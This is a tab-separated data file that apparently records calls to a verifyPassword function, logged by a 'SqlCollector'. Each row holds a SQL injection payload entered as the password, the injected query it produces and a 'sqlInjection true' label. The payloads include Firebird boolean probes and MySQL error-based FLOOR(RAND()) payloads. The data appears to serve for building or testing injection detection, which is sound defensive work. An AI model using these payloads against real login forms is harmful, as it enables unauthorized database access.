SqlCollector	verifyPassword	name--KEY_VALUE_SEPARATOR--fakeuser--PARAM_SEPARATOR--password--KEY_VALUE_SEPARATOR--Demo12345' AND 197=(':hnx:'||(SELECT CASE 197 WHEN 197 THEN 1 ELSE 0 END FROM RDB$DATABASE)||':lna:')	id--KEY_VALUE_SEPARATOR--null	inputValid--KEY_VALUE_SEPARATOR--false	outputValid--KEY_VALUE_SEPARATOR--false	sqlQuery--KEY_VALUE_SEPARATOR--SELECT id FROM employees WHERE name='fakeuser' AND password='Demo12345' AND 197=(':hnx:'||(SELECT CASE 197 WHEN 197 THEN 1 ELSE 0 END FROM RDB$DATABASE)||':lna:')';	sqlInjection--KEY_VALUE_SEPARATOR--true
SqlCollector	verifyPassword	name--KEY_VALUE_SEPARATOR--fakeuser--PARAM_SEPARATOR--password--KEY_VALUE_SEPARATOR--Demo12345" AND 197=(':hnx:'||(SELECT CASE 197 WHEN 197 THEN 1 ELSE 0 END FROM RDB$DATABASE)||':lna:')	id--KEY_VALUE_SEPARATOR--null	inputValid--KEY_VALUE_SEPARATOR--false	outputValid--KEY_VALUE_SEPARATOR--false	sqlQuery--KEY_VALUE_SEPARATOR--SELECT id FROM employees WHERE name='fakeuser' AND password='Demo12345" AND 197=(':hnx:'||(SELECT CASE 197 WHEN 197 THEN 1 ELSE 0 END FROM RDB$DATABASE)||':lna:')';	sqlInjection--KEY_VALUE_SEPARATOR--true
SqlCollector	verifyPassword	name--KEY_VALUE_SEPARATOR--fakeuser--PARAM_SEPARATOR--password--KEY_VALUE_SEPARATOR--Demo12345) AND 197=(':hnx:'||(SELECT CASE 197 WHEN 197 THEN 1 ELSE 0 END FROM RDB$DATABASE)||':lna:') AND (9423=9423	id--KEY_VALUE_SEPARATOR--null	inputValid--KEY_VALUE_SEPARATOR--false	outputValid--KEY_VALUE_SEPARATOR--false	sqlQuery--KEY_VALUE_SEPARATOR--SELECT id FROM employees WHERE name='fakeuser' AND password='Demo12345) AND 197=(':hnx:'||(SELECT CASE 197 WHEN 197 THEN 1 ELSE 0 END FROM RDB$DATABASE)||':lna:') AND (9423=9423';	sqlInjection--KEY_VALUE_SEPARATOR--true
SqlCollector	verifyPassword	name--KEY_VALUE_SEPARATOR--fakeuser--PARAM_SEPARATOR--password--KEY_VALUE_SEPARATOR--Demo12345)) AND 197=(':hnx:'||(SELECT CASE 197 WHEN 197 THEN 1 ELSE 0 END FROM RDB$DATABASE)||':lna:') AND ((8263=8263	id--KEY_VALUE_SEPARATOR--null	inputValid--KEY_VALUE_SEPARATOR--false	outputValid--KEY_VALUE_SEPARATOR--false	sqlQuery--KEY_VALUE_SEPARATOR--SELECT id FROM employees WHERE name='fakeuser' AND password='Demo12345)) AND 197=(':hnx:'||(SELECT CASE 197 WHEN 197 THEN 1 ELSE 0 END FROM RDB$DATABASE)||':lna:') AND ((8263=8263';	sqlInjection--KEY_VALUE_SEPARATOR--true
SqlCollector	verifyPassword	name--KEY_VALUE_SEPARATOR--fakeuser--PARAM_SEPARATOR--password--KEY_VALUE_SEPARATOR--Demo12345))) AND 197=(':hnx:'||(SELECT CASE 197 WHEN 197 THEN 1 ELSE 0 END FROM RDB$DATABASE)||':lna:') AND (((5427=5427	id--KEY_VALUE_SEPARATOR--null	inputValid--KEY_VALUE_SEPARATOR--false	outputValid--KEY_VALUE_SEPARATOR--false	sqlQuery--KEY_VALUE_SEPARATOR--SELECT id FROM employees WHERE name='fakeuser' AND password='Demo12345))) AND 197=(':hnx:'||(SELECT CASE 197 WHEN 197 THEN 1 ELSE 0 END FROM RDB$DATABASE)||':lna:') AND (((5427=5427';	sqlInjection--KEY_VALUE_SEPARATOR--true
SqlCollector	verifyPassword	name--KEY_VALUE_SEPARATOR--fakeuser--PARAM_SEPARATOR--password--KEY_VALUE_SEPARATOR--Demo12345 AND 197=(':hnx:'||(SELECT CASE 197 WHEN 197 THEN 1 ELSE 0 END FROM RDB$DATABASE)||':lna:')	id--KEY_VALUE_SEPARATOR--null	inputValid--KEY_VALUE_SEPARATOR--false	outputValid--KEY_VALUE_SEPARATOR--false	sqlQuery--KEY_VALUE_SEPARATOR--SELECT id FROM employees WHERE name='fakeuser' AND password='Demo12345 AND 197=(':hnx:'||(SELECT CASE 197 WHEN 197 THEN 1 ELSE 0 END FROM RDB$DATABASE)||':lna:')';	sqlInjection--KEY_VALUE_SEPARATOR--true
SqlCollector	verifyPassword	name--KEY_VALUE_SEPARATOR--fakeuser--PARAM_SEPARATOR--password--KEY_VALUE_SEPARATOR--Demo12345') AND 197=(':hnx:'||(SELECT CASE 197 WHEN 197 THEN 1 ELSE 0 END FROM RDB$DATABASE)||':lna:') AND ('goeB'='goeB	id--KEY_VALUE_SEPARATOR--null	inputValid--KEY_VALUE_SEPARATOR--false	outputValid--KEY_VALUE_SEPARATOR--false	sqlQuery--KEY_VALUE_SEPARATOR--SELECT id FROM employees WHERE name='fakeuser' AND password='Demo12345') AND 197=(':hnx:'||(SELECT CASE 197 WHEN 197 THEN 1 ELSE 0 END FROM RDB$DATABASE)||':lna:') AND ('goeB'='goeB';	sqlInjection--KEY_VALUE_SEPARATOR--true
SqlCollector	verifyPassword	name--KEY_VALUE_SEPARATOR--fakeuser--PARAM_SEPARATOR--password--KEY_VALUE_SEPARATOR--Demo12345')) AND 197=(':hnx:'||(SELECT CASE 197 WHEN 197 THEN 1 ELSE 0 END FROM RDB$DATABASE)||':lna:') AND (('IbRa'='IbRa	id--KEY_VALUE_SEPARATOR--null	inputValid--KEY_VALUE_SEPARATOR--false	outputValid--KEY_VALUE_SEPARATOR--false	sqlQuery--KEY_VALUE_SEPARATOR--SELECT id FROM employees WHERE name='fakeuser' AND password='Demo12345')) AND 197=(':hnx:'||(SELECT CASE 197 WHEN 197 THEN 1 ELSE 0 END FROM RDB$DATABASE)||':lna:') AND (('IbRa'='IbRa';	sqlInjection--KEY_VALUE_SEPARATOR--true
SqlCollector	verifyPassword	name--KEY_VALUE_SEPARATOR--fakeuser--PARAM_SEPARATOR--password--KEY_VALUE_SEPARATOR--Demo12345'))) AND 197=(':hnx:'||(SELECT CASE 197 WHEN 197 THEN 1 ELSE 0 END FROM RDB$DATABASE)||':lna:') AND ((('arWs'='arWs	id--KEY_VALUE_SEPARATOR--null	inputValid--KEY_VALUE_SEPARATOR--false	outputValid--KEY_VALUE_SEPARATOR--false	sqlQuery--KEY_VALUE_SEPARATOR--SELECT id FROM employees WHERE name='fakeuser' AND password='Demo12345'))) AND 197=(':hnx:'||(SELECT CASE 197 WHEN 197 THEN 1 ELSE 0 END FROM RDB$DATABASE)||':lna:') AND ((('arWs'='arWs';	sqlInjection--KEY_VALUE_SEPARATOR--true
SqlCollector	verifyPassword	name--KEY_VALUE_SEPARATOR--fakeuser--PARAM_SEPARATOR--password--KEY_VALUE_SEPARATOR--Demo12345' AND 197=(':hnx:'||(SELECT CASE 197 WHEN 197 THEN 1 ELSE 0 END FROM RDB$DATABASE)||':lna:') AND 'munH'='munH	id--KEY_VALUE_SEPARATOR--null	inputValid--KEY_VALUE_SEPARATOR--false	outputValid--KEY_VALUE_SEPARATOR--false	sqlQuery--KEY_VALUE_SEPARATOR--SELECT id FROM employees WHERE name='fakeuser' AND password='Demo12345' AND 197=(':hnx:'||(SELECT CASE 197 WHEN 197 THEN 1 ELSE 0 END FROM RDB$DATABASE)||':lna:') AND 'munH'='munH';	sqlInjection--KEY_VALUE_SEPARATOR--true
SqlCollector	verifyPassword	name--KEY_VALUE_SEPARATOR--fakeuser--PARAM_SEPARATOR--password--KEY_VALUE_SEPARATOR--Demo12345') AND 197=(':hnx:'||(SELECT CASE 197 WHEN 197 THEN 1 ELSE 0 END FROM RDB$DATABASE)||':lna:') AND ('gZPn' LIKE 'gZPn	id--KEY_VALUE_SEPARATOR--null	inputValid--KEY_VALUE_SEPARATOR--false	outputValid--KEY_VALUE_SEPARATOR--false	sqlQuery--KEY_VALUE_SEPARATOR--SELECT id FROM employees WHERE name='fakeuser' AND password='Demo12345') AND 197=(':hnx:'||(SELECT CASE 197 WHEN 197 THEN 1 ELSE 0 END FROM RDB$DATABASE)||':lna:') AND ('gZPn' LIKE 'gZPn';	sqlInjection--KEY_VALUE_SEPARATOR--true
SqlCollector	verifyPassword	name--KEY_VALUE_SEPARATOR--fakeuser--PARAM_SEPARATOR--password--KEY_VALUE_SEPARATOR--Demo12345')) AND 197=(':hnx:'||(SELECT CASE 197 WHEN 197 THEN 1 ELSE 0 END FROM RDB$DATABASE)||':lna:') AND (('qKZc' LIKE 'qKZc	id--KEY_VALUE_SEPARATOR--null	inputValid--KEY_VALUE_SEPARATOR--false	outputValid--KEY_VALUE_SEPARATOR--false	sqlQuery--KEY_VALUE_SEPARATOR--SELECT id FROM employees WHERE name='fakeuser' AND password='Demo12345')) AND 197=(':hnx:'||(SELECT CASE 197 WHEN 197 THEN 1 ELSE 0 END FROM RDB$DATABASE)||':lna:') AND (('qKZc' LIKE 'qKZc';	sqlInjection--KEY_VALUE_SEPARATOR--true
SqlCollector	verifyPassword	name--KEY_VALUE_SEPARATOR--fakeuser--PARAM_SEPARATOR--password--KEY_VALUE_SEPARATOR--Demo12345'))) AND 197=(':hnx:'||(SELECT CASE 197 WHEN 197 THEN 1 ELSE 0 END FROM RDB$DATABASE)||':lna:') AND ((('UMBS' LIKE 'UMBS	id--KEY_VALUE_SEPARATOR--null	inputValid--KEY_VALUE_SEPARATOR--false	outputValid--KEY_VALUE_SEPARATOR--false	sqlQuery--KEY_VALUE_SEPARATOR--SELECT id FROM employees WHERE name='fakeuser' AND password='Demo12345'))) AND 197=(':hnx:'||(SELECT CASE 197 WHEN 197 THEN 1 ELSE 0 END FROM RDB$DATABASE)||':lna:') AND ((('UMBS' LIKE 'UMBS';	sqlInjection--KEY_VALUE_SEPARATOR--true
SqlCollector	verifyPassword	name--KEY_VALUE_SEPARATOR--fakeuser--PARAM_SEPARATOR--password--KEY_VALUE_SEPARATOR--Demo12345' AND 197=(':hnx:'||(SELECT CASE 197 WHEN 197 THEN 1 ELSE 0 END FROM RDB$DATABASE)||':lna:') AND 'urEy' LIKE 'urEy	id--KEY_VALUE_SEPARATOR--null	inputValid--KEY_VALUE_SEPARATOR--false	outputValid--KEY_VALUE_SEPARATOR--false	sqlQuery--KEY_VALUE_SEPARATOR--SELECT id FROM employees WHERE name='fakeuser' AND password='Demo12345' AND 197=(':hnx:'||(SELECT CASE 197 WHEN 197 THEN 1 ELSE 0 END FROM RDB$DATABASE)||':lna:') AND 'urEy' LIKE 'urEy';	sqlInjection--KEY_VALUE_SEPARATOR--true
SqlCollector	verifyPassword	name--KEY_VALUE_SEPARATOR--fakeuser--PARAM_SEPARATOR--password--KEY_VALUE_SEPARATOR--Demo12345") AND 197=(':hnx:'||(SELECT CASE 197 WHEN 197 THEN 1 ELSE 0 END FROM RDB$DATABASE)||':lna:') AND ("pctA"="pctA	id--KEY_VALUE_SEPARATOR--null	inputValid--KEY_VALUE_SEPARATOR--false	outputValid--KEY_VALUE_SEPARATOR--false	sqlQuery--KEY_VALUE_SEPARATOR--SELECT id FROM employees WHERE name='fakeuser' AND password='Demo12345") AND 197=(':hnx:'||(SELECT CASE 197 WHEN 197 THEN 1 ELSE 0 END FROM RDB$DATABASE)||':lna:') AND ("pctA"="pctA';	sqlInjection--KEY_VALUE_SEPARATOR--true
SqlCollector	verifyPassword	name--KEY_VALUE_SEPARATOR--fakeuser--PARAM_SEPARATOR--password--KEY_VALUE_SEPARATOR--Demo12345")) AND 197=(':hnx:'||(SELECT CASE 197 WHEN 197 THEN 1 ELSE 0 END FROM RDB$DATABASE)||':lna:') AND (("ImNY"="ImNY	id--KEY_VALUE_SEPARATOR--null	inputValid--KEY_VALUE_SEPARATOR--false	outputValid--KEY_VALUE_SEPARATOR--false	sqlQuery--KEY_VALUE_SEPARATOR--SELECT id FROM employees WHERE name='fakeuser' AND password='Demo12345")) AND 197=(':hnx:'||(SELECT CASE 197 WHEN 197 THEN 1 ELSE 0 END FROM RDB$DATABASE)||':lna:') AND (("ImNY"="ImNY';	sqlInjection--KEY_VALUE_SEPARATOR--true
SqlCollector	verifyPassword	name--KEY_VALUE_SEPARATOR--fakeuser--PARAM_SEPARATOR--password--KEY_VALUE_SEPARATOR--Demo12345"))) AND 197=(':hnx:'||(SELECT CASE 197 WHEN 197 THEN 1 ELSE 0 END FROM RDB$DATABASE)||':lna:') AND ((("Pgay"="Pgay	id--KEY_VALUE_SEPARATOR--null	inputValid--KEY_VALUE_SEPARATOR--false	outputValid--KEY_VALUE_SEPARATOR--false	sqlQuery--KEY_VALUE_SEPARATOR--SELECT id FROM employees WHERE name='fakeuser' AND password='Demo12345"))) AND 197=(':hnx:'||(SELECT CASE 197 WHEN 197 THEN 1 ELSE 0 END FROM RDB$DATABASE)||':lna:') AND ((("Pgay"="Pgay';	sqlInjection--KEY_VALUE_SEPARATOR--true
SqlCollector	verifyPassword	name--KEY_VALUE_SEPARATOR--fakeuser--PARAM_SEPARATOR--password--KEY_VALUE_SEPARATOR--Demo12345" AND 197=(':hnx:'||(SELECT CASE 197 WHEN 197 THEN 1 ELSE 0 END FROM RDB$DATABASE)||':lna:') AND "iuwK"="iuwK	id--KEY_VALUE_SEPARATOR--null	inputValid--KEY_VALUE_SEPARATOR--false	outputValid--KEY_VALUE_SEPARATOR--false	sqlQuery--KEY_VALUE_SEPARATOR--SELECT id FROM employees WHERE name='fakeuser' AND password='Demo12345" AND 197=(':hnx:'||(SELECT CASE 197 WHEN 197 THEN 1 ELSE 0 END FROM RDB$DATABASE)||':lna:') AND "iuwK"="iuwK';	sqlInjection--KEY_VALUE_SEPARATOR--true
SqlCollector	verifyPassword	name--KEY_VALUE_SEPARATOR--fakeuser--PARAM_SEPARATOR--password--KEY_VALUE_SEPARATOR--Demo12345") AND 197=(':hnx:'||(SELECT CASE 197 WHEN 197 THEN 1 ELSE 0 END FROM RDB$DATABASE)||':lna:') AND ("PNoL" LIKE "PNoL	id--KEY_VALUE_SEPARATOR--null	inputValid--KEY_VALUE_SEPARATOR--false	outputValid--KEY_VALUE_SEPARATOR--false	sqlQuery--KEY_VALUE_SEPARATOR--SELECT id FROM employees WHERE name='fakeuser' AND password='Demo12345") AND 197=(':hnx:'||(SELECT CASE 197 WHEN 197 THEN 1 ELSE 0 END FROM RDB$DATABASE)||':lna:') AND ("PNoL" LIKE "PNoL';	sqlInjection--KEY_VALUE_SEPARATOR--true
SqlCollector	verifyPassword	name--KEY_VALUE_SEPARATOR--fakeuser--PARAM_SEPARATOR--password--KEY_VALUE_SEPARATOR--Demo12345")) AND 197=(':hnx:'||(SELECT CASE 197 WHEN 197 THEN 1 ELSE 0 END FROM RDB$DATABASE)||':lna:') AND (("aPEI" LIKE "aPEI	id--KEY_VALUE_SEPARATOR--null	inputValid--KEY_VALUE_SEPARATOR--false	outputValid--KEY_VALUE_SEPARATOR--false	sqlQuery--KEY_VALUE_SEPARATOR--SELECT id FROM employees WHERE name='fakeuser' AND password='Demo12345")) AND 197=(':hnx:'||(SELECT CASE 197 WHEN 197 THEN 1 ELSE 0 END FROM RDB$DATABASE)||':lna:') AND (("aPEI" LIKE "aPEI';	sqlInjection--KEY_VALUE_SEPARATOR--true
SqlCollector	verifyPassword	name--KEY_VALUE_SEPARATOR--fakeuser--PARAM_SEPARATOR--password--KEY_VALUE_SEPARATOR--Demo12345"))) AND 197=(':hnx:'||(SELECT CASE 197 WHEN 197 THEN 1 ELSE 0 END FROM RDB$DATABASE)||':lna:') AND ((("GjNt" LIKE "GjNt	id--KEY_VALUE_SEPARATOR--null	inputValid--KEY_VALUE_SEPARATOR--false	outputValid--KEY_VALUE_SEPARATOR--false	sqlQuery--KEY_VALUE_SEPARATOR--SELECT id FROM employees WHERE name='fakeuser' AND password='Demo12345"))) AND 197=(':hnx:'||(SELECT CASE 197 WHEN 197 THEN 1 ELSE 0 END FROM RDB$DATABASE)||':lna:') AND ((("GjNt" LIKE "GjNt';	sqlInjection--KEY_VALUE_SEPARATOR--true
SqlCollector	verifyPassword	name--KEY_VALUE_SEPARATOR--fakeuser--PARAM_SEPARATOR--password--KEY_VALUE_SEPARATOR--Demo12345" AND 197=(':hnx:'||(SELECT CASE 197 WHEN 197 THEN 1 ELSE 0 END FROM RDB$DATABASE)||':lna:') AND "wLrj" LIKE "wLrj	id--KEY_VALUE_SEPARATOR--null	inputValid--KEY_VALUE_SEPARATOR--false	outputValid--KEY_VALUE_SEPARATOR--false	sqlQuery--KEY_VALUE_SEPARATOR--SELECT id FROM employees WHERE name='fakeuser' AND password='Demo12345" AND 197=(':hnx:'||(SELECT CASE 197 WHEN 197 THEN 1 ELSE 0 END FROM RDB$DATABASE)||':lna:') AND "wLrj" LIKE "wLrj';	sqlInjection--KEY_VALUE_SEPARATOR--true
SqlCollector	verifyPassword	name--KEY_VALUE_SEPARATOR--fakeuser--PARAM_SEPARATOR--password--KEY_VALUE_SEPARATOR---5171	id--KEY_VALUE_SEPARATOR--null	inputValid--KEY_VALUE_SEPARATOR--false	outputValid--KEY_VALUE_SEPARATOR--false	sqlQuery--KEY_VALUE_SEPARATOR--SELECT id FROM employees WHERE name='fakeuser' AND password='-5171';	sqlInjection--KEY_VALUE_SEPARATOR--true
SqlCollector	verifyPassword	name--KEY_VALUE_SEPARATOR--fakeuser--PARAM_SEPARATOR--password--KEY_VALUE_SEPARATOR---1916) OR (SELECT 7542 FROM(SELECT COUNT(*),CONCAT(CHAR(58,104,110,120,58),(SELECT (CASE WHEN (7542=7542) THEN 1 ELSE 0 END)),CHAR(58,108,110,97,58),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)	id--KEY_VALUE_SEPARATOR--null	inputValid--KEY_VALUE_SEPARATOR--false	outputValid--KEY_VALUE_SEPARATOR--false	sqlQuery--KEY_VALUE_SEPARATOR--SELECT id FROM employees WHERE name='fakeuser' AND password='-1916) OR (SELECT 7542 FROM(SELECT COUNT(*),CONCAT(CHAR(58,104,110,120,58),(SELECT (CASE WHEN (7542=7542) THEN 1 ELSE 0 END)),CHAR(58,108,110,97,58),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)';	sqlInjection--KEY_VALUE_SEPARATOR--true
SqlCollector	verifyPassword	name--KEY_VALUE_SEPARATOR--fakeuser--PARAM_SEPARATOR--password--KEY_VALUE_SEPARATOR---2407	id--KEY_VALUE_SEPARATOR--null	inputValid--KEY_VALUE_SEPARATOR--false	outputValid--KEY_VALUE_SEPARATOR--false	sqlQuery--KEY_VALUE_SEPARATOR--SELECT id FROM employees WHERE name='fakeuser' AND password='-2407';	sqlInjection--KEY_VALUE_SEPARATOR--true
SqlCollector	verifyPassword	name--KEY_VALUE_SEPARATOR--fakeuser--PARAM_SEPARATOR--password--KEY_VALUE_SEPARATOR---1023') OR (SELECT 7542 FROM(SELECT COUNT(*),CONCAT(CHAR(58,104,110,120,58),(SELECT (CASE WHEN (7542=7542) THEN 1 ELSE 0 END)),CHAR(58,108,110,97,58),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)	id--KEY_VALUE_SEPARATOR--null	inputValid--KEY_VALUE_SEPARATOR--false	outputValid--KEY_VALUE_SEPARATOR--false	sqlQuery--KEY_VALUE_SEPARATOR--SELECT id FROM employees WHERE name='fakeuser' AND password='-1023') OR (SELECT 7542 FROM(SELECT COUNT(*),CONCAT(CHAR(58,104,110,120,58),(SELECT (CASE WHEN (7542=7542) THEN 1 ELSE 0 END)),CHAR(58,108,110,97,58),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)';	sqlInjection--KEY_VALUE_SEPARATOR--true
SqlCollector	verifyPassword	name--KEY_VALUE_SEPARATOR--fakeuser--PARAM_SEPARATOR--password--KEY_VALUE_SEPARATOR---923	id--KEY_VALUE_SEPARATOR--null	inputValid--KEY_VALUE_SEPARATOR--false	outputValid--KEY_VALUE_SEPARATOR--false	sqlQuery--KEY_VALUE_SEPARATOR--SELECT id FROM employees WHERE name='fakeuser' AND password='-923';	sqlInjection--KEY_VALUE_SEPARATOR--true
SqlCollector	verifyPassword	name--KEY_VALUE_SEPARATOR--fakeuser--PARAM_SEPARATOR--password--KEY_VALUE_SEPARATOR---1352' OR (SELECT 7542 FROM(SELECT COUNT(*),CONCAT(CHAR(58,104,110,120,58),(SELECT (CASE WHEN (7542=7542) THEN 1 ELSE 0 END)),CHAR(58,108,110,97,58),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)	id--KEY_VALUE_SEPARATOR--null	inputValid--KEY_VALUE_SEPARATOR--false	outputValid--KEY_VALUE_SEPARATOR--false	sqlQuery--KEY_VALUE_SEPARATOR--SELECT id FROM employees WHERE name='fakeuser' AND password='-1352' OR (SELECT 7542 FROM(SELECT COUNT(*),CONCAT(CHAR(58,104,110,120,58),(SELECT (CASE WHEN (7542=7542) THEN 1 ELSE 0 END)),CHAR(58,108,110,97,58),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)';	sqlInjection--KEY_VALUE_SEPARATOR--true
SqlCollector	verifyPassword	name--KEY_VALUE_SEPARATOR--fakeuser--PARAM_SEPARATOR--password--KEY_VALUE_SEPARATOR---10	id--KEY_VALUE_SEPARATOR--null	inputValid--KEY_VALUE_SEPARATOR--false	outputValid--KEY_VALUE_SEPARATOR--false	sqlQuery--KEY_VALUE_SEPARATOR--SELECT id FROM employees WHERE name='fakeuser' AND password='-10';	sqlInjection--KEY_VALUE_SEPARATOR--true
SqlCollector	verifyPassword	name--KEY_VALUE_SEPARATOR--fakeuser--PARAM_SEPARATOR--password--KEY_VALUE_SEPARATOR---5931" OR (SELECT 7542 FROM(SELECT COUNT(*),CONCAT(CHAR(58,104,110,120,58),(SELECT (CASE WHEN (7542=7542) THEN 1 ELSE 0 END)),CHAR(58,108,110,97,58),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)	id--KEY_VALUE_SEPARATOR--null	inputValid--KEY_VALUE_SEPARATOR--false	outputValid--KEY_VALUE_SEPARATOR--false	sqlQuery--KEY_VALUE_SEPARATOR--SELECT id FROM employees WHERE name='fakeuser' AND password='-5931" OR (SELECT 7542 FROM(SELECT COUNT(*),CONCAT(CHAR(58,104,110,120,58),(SELECT (CASE WHEN (7542=7542) THEN 1 ELSE 0 END)),CHAR(58,108,110,97,58),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)';	sqlInjection--KEY_VALUE_SEPARATOR--true
SqlCollector	verifyPassword	name--KEY_VALUE_SEPARATOR--fakeuser--PARAM_SEPARATOR--password--KEY_VALUE_SEPARATOR---6557	id--KEY_VALUE_SEPARATOR--null	inputValid--KEY_VALUE_SEPARATOR--false	outputValid--KEY_VALUE_SEPARATOR--false	sqlQuery--KEY_VALUE_SEPARATOR--SELECT id FROM employees WHERE name='fakeuser' AND password='-6557';	sqlInjection--KEY_VALUE_SEPARATOR--true
SqlCollector	verifyPassword	name--KEY_VALUE_SEPARATOR--fakeuser--PARAM_SEPARATOR--password--KEY_VALUE_SEPARATOR---9503) OR (SELECT 7542 FROM(SELECT COUNT(*),CONCAT(CHAR(58,104,110,120,58),(SELECT (CASE WHEN (7542=7542) THEN 1 ELSE 0 END)),CHAR(58,108,110,97,58),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) AND (6879=6879	id--KEY_VALUE_SEPARATOR--null	inputValid--KEY_VALUE_SEPARATOR--false	outputValid--KEY_VALUE_SEPARATOR--false	sqlQuery--KEY_VALUE_SEPARATOR--SELECT id FROM employees WHERE name='fakeuser' AND password='-9503) OR (SELECT 7542 FROM(SELECT COUNT(*),CONCAT(CHAR(58,104,110,120,58),(SELECT (CASE WHEN (7542=7542) THEN 1 ELSE 0 END)),CHAR(58,108,110,97,58),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) AND (6879=6879';	sqlInjection--KEY_VALUE_SEPARATOR--true
SqlCollector	verifyPassword	name--KEY_VALUE_SEPARATOR--fakeuser--PARAM_SEPARATOR--password--KEY_VALUE_SEPARATOR---2445	id--KEY_VALUE_SEPARATOR--null	inputValid--KEY_VALUE_SEPARATOR--false	outputValid--KEY_VALUE_SEPARATOR--false	sqlQuery--KEY_VALUE_SEPARATOR--SELECT id FROM employees WHERE name='fakeuser' AND password='-2445';	sqlInjection--KEY_VALUE_SEPARATOR--true
SqlCollector	verifyPassword	name--KEY_VALUE_SEPARATOR--fakeuser--PARAM_SEPARATOR--password--KEY_VALUE_SEPARATOR---1583)) OR (SELECT 7542 FROM(SELECT COUNT(*),CONCAT(CHAR(58,104,110,120,58),(SELECT (CASE WHEN (7542=7542) THEN 1 ELSE 0 END)),CHAR(58,108,110,97,58),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) AND ((8615=8615	id--KEY_VALUE_SEPARATOR--null	inputValid--KEY_VALUE_SEPARATOR--false	outputValid--KEY_VALUE_SEPARATOR--false	sqlQuery--KEY_VALUE_SEPARATOR--SELECT id FROM employees WHERE name='fakeuser' AND password='-1583)) OR (SELECT 7542 FROM(SELECT COUNT(*),CONCAT(CHAR(58,104,110,120,58),(SELECT (CASE WHEN (7542=7542) THEN 1 ELSE 0 END)),CHAR(58,108,110,97,58),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) AND ((8615=8615';	sqlInjection--KEY_VALUE_SEPARATOR--true
SqlCollector	verifyPassword	name--KEY_VALUE_SEPARATOR--fakeuser--PARAM_SEPARATOR--password--KEY_VALUE_SEPARATOR---5584	id--KEY_VALUE_SEPARATOR--null	inputValid--KEY_VALUE_SEPARATOR--false	outputValid--KEY_VALUE_SEPARATOR--false	sqlQuery--KEY_VALUE_SEPARATOR--SELECT id FROM employees WHERE name='fakeuser' AND password='-5584';	sqlInjection--KEY_VALUE_SEPARATOR--true
SqlCollector	verifyPassword	name--KEY_VALUE_SEPARATOR--fakeuser--PARAM_SEPARATOR--password--KEY_VALUE_SEPARATOR---6008))) OR (SELECT 7542 FROM(SELECT COUNT(*),CONCAT(CHAR(58,104,110,120,58),(SELECT (CASE WHEN (7542=7542) THEN 1 ELSE 0 END)),CHAR(58,108,110,97,58),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) AND (((1771=1771	id--KEY_VALUE_SEPARATOR--null	inputValid--KEY_VALUE_SEPARATOR--false	outputValid--KEY_VALUE_SEPARATOR--false	sqlQuery--KEY_VALUE_SEPARATOR--SELECT id FROM employees WHERE name='fakeuser' AND password='-6008))) OR (SELECT 7542 FROM(SELECT COUNT(*),CONCAT(CHAR(58,104,110,120,58),(SELECT (CASE WHEN (7542=7542) THEN 1 ELSE 0 END)),CHAR(58,108,110,97,58),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) AND (((1771=1771';	sqlInjection--KEY_VALUE_SEPARATOR--true
SqlCollector	verifyPassword	name--KEY_VALUE_SEPARATOR--fakeuser--PARAM_SEPARATOR--password--KEY_VALUE_SEPARATOR---65	id--KEY_VALUE_SEPARATOR--null	inputValid--KEY_VALUE_SEPARATOR--false	outputValid--KEY_VALUE_SEPARATOR--false	sqlQuery--KEY_VALUE_SEPARATOR--SELECT id FROM employees WHERE name='fakeuser' AND password='-65';	sqlInjection--KEY_VALUE_SEPARATOR--true
